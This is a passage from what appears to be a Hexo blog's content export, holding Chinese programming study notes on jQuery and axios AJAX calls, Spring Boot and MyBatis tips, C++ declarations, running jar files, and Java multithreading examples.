<h3 id="JQuery通用请求方法"><a href="#JQuery通用请求方法" class="headerlink" title="JQuery通用请求方法"></a>JQuery通用请求方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">    url: <span class="string">&quot;http://localhost:8080&quot;</span>,	<span class="comment">//url</span></span><br><span class="line"></span><br><span class="line">    data: &#123;<span class="attr">a</span>: <span class="number">100</span>, <span class="attr">b</span>: <span class="number">200</span>&#125;,			<span class="comment">//参数</span></span><br><span class="line"></span><br><span class="line">    type: <span class="string">&#x27;GET&#x27;</span>,			<span class="comment">//请求类型，也可以是&#x27;POST&#x27;</span></span><br><span class="line">    dataType: <span class="string">&#x27;json&#x27;</span>,				<span class="comment">//响应体结果</span></span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;		    <span class="comment">//成功的回调</span></span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line">    &#125;,</span><br><span class="line">    timeout: <span class="number">2000</span>,				    <span class="comment">//超时时间</span></span><br><span class="line">    error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;		    <span class="comment">//失败的回调</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;c出错啦！！&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    headers: &#123;			    <span class="comment">//头信息</span></span><br><span class="line">        <span class="comment">/*请求头*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Axios发送Ajax请求请求"><a href="#Axios发送Ajax请求请求" class="headerlink" title="Axios发送Ajax请求请求"></a>Axios发送Ajax请求请求</h2><p>Axios 是一个<strong>基于 Promise</strong>（ES6中用于处理异步的）的 HTTP 库</p>
<p><strong>下面的写法与，jQuery的$作用一样，都是，直接执行了该请求，所以一般，我们常放在函数中，以便需要请求的时候在请求</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios(config)</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求方法的别名</span></span><br><span class="line">axios.request(config)</span><br><span class="line">axios.get(url[, config])</span><br><span class="line">axios.delete(url[, config])</span><br><span class="line">axios.head(url[, config])</span><br><span class="line">axios.post(url[, data[, config]])</span><br><span class="line">axios.put(url[, data[, config]])</span><br><span class="line">axios.patch(url[, data[, config]])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中config可以根据需求进行配置<a href="http://www.axios-js.com/zh-cn/docs/#axios-config">（配置大全）</a>：</p>
<p><strong>axios请求成功和失败，分别会执行then，catch，详见下例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.get(<span class="string">&quot;http://localhost:8080&quot;</span>, &#123;</span><br><span class="line">                <span class="comment">//携带的参数</span></span><br><span class="line">                params: &#123;</span><br><span class="line">                    id: <span class="number">100</span>,</span><br><span class="line">                    vip: <span class="number">7</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//请求头信息</span></span><br><span class="line">                headers: &#123;</span><br><span class="line">                    Accept: <span class="string">&quot;text/html,image/apng&quot;</span>      <span class="comment">//代表客户端希望接受的数据类型是html或者是png图片类型</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;							</span><br><span class="line">            <span class="comment">//成功返回，如果请求成功，就会执行then函数，且将请求得到的响应，作为参数，传给then中的函数的参数使用</span></span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//失败返回，如果请求失败，就会执行then函数，且将失败信息，作为参数，传给catch中的函数的参数使用</span></span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<p><strong>上面的写法与，jQuery的$作用一样，都是，直接执行了该请求，所以一般，我们常放在函数中，以便需要请求的时候在请求</strong></p>
<h4 id="在Vue中，通常Promise和Axios一块使用"><a href="#在Vue中，通常Promise和Axios一块使用" class="headerlink" title="在Vue中，通常Promise和Axios一块使用"></a>在Vue中，通常Promise和Axios一块使用</h4><p>案例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      axios(&#123;	<span class="comment">//在Promise的内部可以执行一个axios的一个网络请求，然后根据axios的执行结果，选择执行resolve和reject函数</span></span><br><span class="line">            url: url</span><br><span class="line">            method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            data: &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">              resolve(res.data);	<span class="comment">//请求成功，执行resolve</span></span><br><span class="line">              <span class="comment">// console.log(res);</span></span><br><span class="line">          &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">              reject(error);		<span class="comment">//请求失败，执行reject</span></span><br><span class="line">              <span class="comment">// console.log(error);</span></span><br><span class="line">          &#125;);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行成功，请求结果为：&quot;</span> + data);</span><br><span class="line">	&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行失败，失败信息为：&quot;</span> + err);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>前端</tag>
        <tag>Ajax</tag>
        <tag>HTTP</tag>
        <tag>jQuery</tag>
        <tag>axios</tag>
        <tag>网络请求</tag>
      </tags>
  </entry>
  <entry>
    <title>前端问题和经验总结</title>
    <url>/2023/05/29/%E5%89%8D%E7%AB%AF%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><span id="more"></span>

<ol>
<li>在fixed的div中，滚轮的滚动事件失效</li>
<li>浏览器禁止直接访问本地资源文件，如果仍要将图片放在本地，可以使用node搭建一个简单的本地服务器，用来访问本地图片</li>
<li>前端使用input上传图片之后获取不到文件的全路径名</li>
<li>在vue中，axios请求可能还未结束，导致需要渲染组件或者使用的数据不存在，从而报错（即使在then中执行打印，也可能在请求之前打印，导致数据不存在出错）</li>
<li>$router：是路由操作对象，只写对象；$route：路由信息对象，只读对象<br>所以前者一般用于路由跳转，后者用于跳转后获取参数</li>
<li>axios的请求发生时机：axios.get()方法被调用后，它会异步创建一个Http请求。这个请求不会立即发出，而是先被加到一个队列中。在事件循环的下一个Tick中，Axios会从队列中取出请求，并将其发送给服务器。<br>当服务器响应请求时，Axios会将响应数据封装成一个对象，并作为Promise对象的参数来resolve它。此时，你可以在Promise的then方法中访问响应数据，并对其进行处理。<br>因此，虽然axios.get()方法的执行可能很快就完成了，但实际上它所发起的请求要经历一段时间的等待和处理，才能最终得到响应数据。</li>
<li>axios.all(axiosList)            // 并发处理多个Promise组成的集合<pre><code>    .then(axios.spread((...result) =&gt; &#123;&#125;))     // then中的函数会在axiosList中所有的Promise返回响应后再执行    axios.spread()中可以用函数作为参数，且该参数函数的形参的顺序和Promise的顺序保持一致（该参数函数的形参也可以是数组）
    .catch(异常处理)
</code></pre>
</li>
</ol>
]]></content>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>后端和数据库经验</title>
    <url>/2023/05/29/%E5%90%8E%E7%AB%AF%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="后端和数据库经验"><a href="#后端和数据库经验" class="headerlink" title="后端和数据库经验"></a>后端和数据库经验</h2><span id="more"></span>

<h4 id="Spring-Boot后端，接收post请求中的数据"><a href="#Spring-Boot后端，接收post请求中的数据" class="headerlink" title="Spring Boot后端，接收post请求中的数据"></a>Spring Boot后端，接收post请求中的数据</h4><p>在使用springboot接受前端传来的文件数据时，如果@controller的方法没有加@ResponseBody，则会出现：请求成功进入了springboot服务器，但是，前端依旧会报404错误<br>（网上有大佬解释说：@ResponseBody的作用时将return的值作为合同谈判请求的内容返回给客户端，也就是说前台直接当成json来接收后台返回的数据；如果不屑@ResponseBody注解，http请求的内容默认是一个页面，有了这个注解就是json字符串了）</p>
<p>接收前端的post请求，要获取数据，使用 @RequestBody，而不是 @RequestParam</p>
<h4 id="Mybatis中比较数据库的语句"><a href="#Mybatis中比较数据库的语句" class="headerlink" title="Mybatis中比较数据库的语句"></a>Mybatis中比较数据库的语句</h4><ol>
<li><p>mybatis的xml文件中的字符串比较，可以直接使用==和!=</p>
</li>
<li><p>进行字符串的模糊查询，在xml中可以通过mysql自带的concat直接实现</p>
</li>
<li><p>where标签能省略语句中的前缀 and，但是它省略不了语句中的后缀and</p>
</li>
</ol>
<h4 id="Sql语句技巧"><a href="#Sql语句技巧" class="headerlink" title="Sql语句技巧"></a>Sql语句技巧</h4><ol>
<li><p>字符串的拼接可以使用concat（a,b,…）</p>
</li>
<li><p>字段的相等比较使用 = ，而不是 == </p>
</li>
</ol>
]]></content>
      <tags>
        <tag>后端</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>声明和定义的区别</title>
    <url>/2021/10/16/%E5%A3%B0%E6%98%8E%E5%92%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="声明和定义的区别"><a href="#声明和定义的区别" class="headerlink" title="声明和定义的区别"></a>声明和定义的区别</h2><span id="more"></span>

<p><strong>定义：</strong>会分配一定的内存空间</p>
<p>常见的定义方式，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;		<span class="comment">//编译器会给变量a分配一定的内存空间（4个字节）</span></span><br></pre></td></tr></table></figure>

<p><strong>声明：</strong>仅仅告诉编译器，有这么个东西，让编译器”认识“这个东西，不一定会分配内存空间</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> a;	<span class="comment">//编译器仅“认识”a，但没有分配内存空间</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>编程基础</tag>
        <tag>声明、定义区别</tag>
      </tags>
  </entry>
  <entry>
    <title>命令行运行jar文件和点击运行jar文件区别</title>
    <url>/2022/02/20/%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cjar%E6%96%87%E4%BB%B6%E5%92%8C%E7%82%B9%E5%87%BB%E8%BF%90%E8%A1%8Cjar%E6%96%87%E4%BB%B6%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/02/20/1mPEyZlcGMQgzJS.png" alt="image-20220220174307272"></p>
<p>①应用程序都可以成功运行</p>
<p>②可能会生成一些其他文件</p>
<p><img src="https://s2.loli.net/2022/02/20/vq1sck58zLWEyD7.png" alt="image-20220220175111112"></p>
<h2 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h2><h3 id="①点击运行jar文件"><a href="#①点击运行jar文件" class="headerlink" title="①点击运行jar文件"></a>①点击运行jar文件</h3><p>jar文件可以得到运行，同时区别于命令行运行在于：①在windows后台里<strong>会有</strong><code>java(TM)platform se binary</code>服务在运行</p>
<p><img src="https://s2.loli.net/2022/02/20/S3qAdHmZJBfY17e.png" alt="image-20220220174028561"></p>
<p><strong>注意：要删除生成的文件，需要先结束这个服务的运行</strong></p>
<h3 id="②命令行运行jar文件"><a href="#②命令行运行jar文件" class="headerlink" title="②命令行运行jar文件"></a>②命令行运行jar文件</h3><p><img src="https://s2.loli.net/2022/02/20/cWVJPYpe5q9AtRB.png" alt="image-20220220174543702"></p>
<p>jar文件可以成功运行，区别在于：①在windows后台里<strong>不会有</strong><code>java(TM)platform se binary</code>服务在运行</p>
<p><img src="https://s2.loli.net/2022/02/20/9txvJu82OVLyG6d.png" alt="image-20220220174842366"></p>
]]></content>
      <tags>
        <tag>jar文件</tag>
        <tag>windows后台应用</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程</title>
    <url>/2021/08/26/%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><span id="more"></span>

<p><strong>程序</strong>是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念</p>
<p><strong>进程</strong>是执行程序的一次执行过程，它是一个动态的概念。是系统资源分配的单位</p>
<p>通常在一个进程中可以包含多个<strong>线程</strong>当然一个进程中至少有一个线程，不然没有存在的意义。</p>
<p><strong>线程是CPU调度和执行的单位</strong></p>
<p>注意：<strong>很多多线程是模拟出来的</strong>，真正的多线程是指由多个CPU，即多核，如服务器。如果是模拟出来的多线程，即在一个CPU的情况下，在同一个时间点，CPU只能执行一个代码，因为切换的很快，所以就有同时执行的错觉</p>
<h2 id="本章核心概念"><a href="#本章核心概念" class="headerlink" title="本章核心概念"></a>本章核心概念</h2><ul>
<li>线程是独立的执行路径</li>
<li>在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程，gc（garbage collection）线程；</li>
<li>main（）称之为主线程，为系统的入口，用于执行整个程序</li>
</ul>
<blockquote>
<p>Java程序都是以main()作为入口的。main函数是一个线程（主线程），同时还是一个进程。在现在的操作系统中，都是多线程的。但是它执行的时候，对外来说就是一个<strong>独立的进程</strong>。这个进程，可以包含多个线程，也可以只包含一个线程</p>
<p>主线程的重要性体现在两个方面：</p>
<ol>
<li>是产生其他子线程的线程</li>
<li>通常它必须最后完成执行，比如执行各种关闭操作</li>
</ol>
<p>线程之间的关系、执行关系如图示：</p>
<img src="https://i.loli.net/2021/08/26/CbYhJ3KRv9HZFUk.png" alt="image-20210826172535380" style="zoom: 33%;" />
</blockquote>
<ul>
<li>在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度，调度器是与操作系统紧密相关的，先后顺序是不能人为的干预的</li>
<li>对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制</li>
<li>线程会带来额外的开销，如CPU调度时间，并发控制开销</li>
<li>每个线程在自己的工作内存交互，内存控制不当会造成数据不一致</li>
</ul>
<h2 id="继承Thread类"><a href="#继承Thread类" class="headerlink" title="继承Thread类"></a>继承Thread类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br></pre></td></tr></table></figure>

<p>线程是程序中的执行线程。<strong>Java虚拟机允许应用程序同时运行多个执行线程</strong></p>
<p>每个线程都有<strong>优先级</strong>，CPU按优先级调度执行线程</p>
<p>当Java虚拟机启动时，通常有一个<strong>非守护进程线程</strong>（通常是调用某些指定类的名为main的方法）。<strong>Java虚拟机将继续执行线程，直到发生以下任一情况</strong>：</p>
<ul>
<li>已经调用了Runtime类的exit方法，并且安全管理器已经允许进行退出操作</li>
<li>所有不是守护进程线程的线程已经死亡，无论是从调用返回到run方法还是抛出超出run方法的run。</li>
</ul>
<p><strong>创建一个新的执行线程有两种方法：</strong></p>
<ul>
<li><p>一个是将一个类声明为Thread的子类。这个子类应该重写run类的方法Thread。然后可以分配并启动子类的实例。</p>
</li>
<li><p>另一种方法来创建一个线程是声明实现类Runnable接口。那个类然后实现了run方法。然后可以分配类的实例，在创建Thread时作为参数传递，并启动。</p>
</li>
</ul>
<h2 id="创建线程实例"><a href="#创建线程实例" class="headerlink" title="创建线程实例"></a>创建线程实例</h2><h3 id="法一：继承自Thread类"><a href="#法一：继承自Thread类" class="headerlink" title="法一：继承自Thread类"></a>法一：继承自Thread类</h3><p><strong>步骤：</strong></p>
<ul>
<li>自定义线程类继承<strong>Thread类</strong></li>
<li>重写**run()**方法</li>
<li>创建线程对象，调用**start()**方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程方式1：继承Thread类，重写run方法，调用start开启线程</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread1</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在看代码-----&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个线程对象，CPU按优先级调度</span></span><br><span class="line">        TestThread1 testThread1 = <span class="keyword">new</span> TestThread1();</span><br><span class="line">        <span class="comment">// 调用start()方法开启线程，执行线程的run函数</span></span><br><span class="line">        testThread1.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在学习多线程-----&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<img src="https://i.loli.net/2021/08/26/exThCw1aboi5pM6.png" alt="image-20210826155918945" style="zoom:50%;" />

<p>执行时，线程和线程同时执行，CPU按优先级调度</p>
<blockquote>
<p><strong>总结：</strong>注意，线程开启不一定立即执行，由CPU调度执行</p>
</blockquote>
<h3 id="法二：实现类Runnable接口"><a href="#法二：实现类Runnable接口" class="headerlink" title="法二：实现类Runnable接口"></a>法二：实现类Runnable接口</h3><p>步骤：</p>
<ul>
<li>定义类<strong>实现Runnable接口</strong></li>
<li>**实现run()**方法，编写线程执行体</li>
<li>创建线程对象，调用**start()**方法启动线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建线程方式2：实现Runnable接口，重写run方法，执行线程需要丢入Runnable接口实现类，调用start方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread3</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// run方法线程体</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在看代码-----&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// main线程，主线程</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个Runnable接口的实现类对象</span></span><br><span class="line">        TestThread3 testThread3 = <span class="keyword">new</span> TestThread3();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类似于静态代理模式</span></span><br><span class="line">        <span class="keyword">new</span> Thread(testThread3).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我在学习多线程-----&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<img src="https://i.loli.net/2021/08/26/df48W6mAlXuGjQ3.png" alt="image-20210826181206428" style="zoom:50%;" />

<ul>
<li><p><strong>实现接口Runnable</strong>具有多线程能力</p>
</li>
<li><p><strong>启动线程：传入目标对象+Thread对象.start()</strong></p>
</li>
<li><p><strong>推荐使用：避免单继承局限性，灵活方便，方便同一个对象被多个线程使用</strong></p>
</li>
</ul>
<h3 id="比较两种方法"><a href="#比较两种方法" class="headerlink" title="比较两种方法"></a>比较两种方法</h3><ul>
<li><p>继承Thread类</p>
<ul>
<li>子类继承Thread类具备多线程能力</li>
<li>启动线程：子类对象.start()</li>
<li><strong>不建议使用</strong>：避免OOP单继承局限性</li>
</ul>
</li>
<li><p>实现Runnable接口</p>
<ul>
<li>实现接口Runnable具有多线程能力</li>
<li>启动线程：传入目标对象+Thread对象.start()</li>
<li><strong>推荐使用</strong>：<strong>避免单继承局限性</strong>，灵活方便，<strong>方便同一个对象被多个线程使用</strong></li>
</ul>
<img src="https://i.loli.net/2021/08/26/QaIKJjtw4ncAovC.png" alt="image-20210826181558650" style="zoom:50%;" /></li>
</ul>
<h3 id="法三：实现Callable接口（暂时了解即可）"><a href="#法三：实现Callable接口（暂时了解即可）" class="headerlink" title="法三：实现Callable接口（暂时了解即可）"></a>法三：实现Callable接口（暂时了解即可）</h3><p>步骤：</p>
<ul>
<li>定义类<strong>实现Callable接口</strong></li>
<li>**实现call()**方法，编写线程执行体</li>
<li><strong>创建执行服务-&gt;提交执行-&gt;获取结果-&gt;关闭服务</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程创建方式3：实现Callable接口</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Callable的好处：</span></span><br><span class="line"><span class="comment"> * 1. 可以定义返回值</span></span><br><span class="line"><span class="comment"> * 2. 可以抛出异常</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCallable</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Boolean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;     <span class="comment">// 图片的网络地址</span></span><br><span class="line">    <span class="keyword">private</span> String name;    <span class="comment">// 图片的文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestCallable</span><span class="params">(String url, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下载图片的执行体</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        WebDownLoader webDownLoader = <span class="keyword">new</span> WebDownLoader();</span><br><span class="line">        webDownLoader.downLoader(url, name);</span><br><span class="line">        System.out.println(<span class="string">&quot;下载了文件名为：&quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        TestCallable t1 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fuploadfile.bizhizu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.cn%2Fup%2Ff1%2Fcd%2F63%2Ff1cd63164d1ff922c286ff631cb22f9b.jpg.source&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.jpg&amp;refer=http%3A%2F%2Fuploadfile.bizhizu.cn&amp;app=2002&amp;size=f9999,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t=05c8225e2a04de881deff50946f3fa06&quot;</span>, <span class="string">&quot;1.jpg&quot;</span>);</span><br><span class="line">        TestCallable t2 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fdik.img.kttpdq&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.com%2Fpic%2F75%2F52402%2F6edaab3c79f9906c.jpg&amp;refer=http%3A%2F%2Fdik.img.kttpdq&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t&quot;</span> +</span><br><span class="line">                <span class="string">&quot;=da0fd2d2933805dfd24439813eaced44&quot;</span>, <span class="string">&quot;2.jpg&quot;</span>);</span><br><span class="line">        TestCallable t3 = <span class="keyword">new</span> TestCallable(<span class="string">&quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fk.zol-img.com&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.cn%2Fnbbbs%2F7336%2Fa7335241_s.jpg&amp;refer=http%3A%2F%2Fk.zol-img.com.cn&amp;app=2002&amp;size=f9999,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1632627419&amp;t=81b1925f8461c1f782fab729e144d479&quot;</span>, <span class="string">&quot;3.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建执行服务：</span></span><br><span class="line">        ExecutorService ser = Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提交执行</span></span><br><span class="line">        Future&lt;Boolean&gt; r1 = ser.submit(t1);</span><br><span class="line">        Future&lt;Boolean&gt; r2 = ser.submit(t2);</span><br><span class="line">        Future&lt;Boolean&gt; r3 = ser.submit(t3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取结果</span></span><br><span class="line">        <span class="keyword">boolean</span> rs1 = r1.get();</span><br><span class="line">        <span class="keyword">boolean</span> rs2 = r2.get();</span><br><span class="line">        <span class="keyword">boolean</span> rs3 = r3.get();</span><br><span class="line"></span><br><span class="line">        System.out.println(rs1);</span><br><span class="line">        System.out.println(rs2);</span><br><span class="line">        System.out.println(rs3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭服务</span></span><br><span class="line">        ser.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用Callable好处：</p>
<ol>
<li>可以定义返回值</li>
<li>可以抛出异常</li>
</ol>
<h2 id="线程中变量的作用域和访问空间"><a href="#线程中变量的作用域和访问空间" class="headerlink" title="线程中变量的作用域和访问空间"></a>线程中变量的作用域和访问空间</h2><p><img src="https://i.loli.net/2021/09/01/ph3ALJX1lg6m4Qe.png" alt="image-20210901101316366"></p>
<h2 id="线程五个状态"><a href="#线程五个状态" class="headerlink" title="线程五个状态"></a>线程五个状态</h2><ul>
<li>创建：new一个线程</li>
<li>就绪：线程start（）进入就绪</li>
<li>运行：CPU调度执行</li>
<li>阻塞：线程执行全被抢夺</li>
<li>死亡：线程执行完毕，销亡</li>
</ul>
<p><strong>注意：死亡之后的线程不可以再次start，因为一个线程不可以启动两次</strong></p>
<h2 id="线程同步机制"><a href="#线程同步机制" class="headerlink" title="线程同步机制"></a>线程同步机制</h2><h3 id="线程同步方法"><a href="#线程同步方法" class="headerlink" title="线程同步方法"></a>线程同步方法</h3><p><strong>关键字：synchronized</strong></p>
<p>关键字放在方法上面，<strong>默认锁住的是this指代的对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BuyTicket</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//票</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticketNums = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;    <span class="comment">//外部停止方式</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//买票</span></span><br><span class="line">        <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                buy();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    synchronized 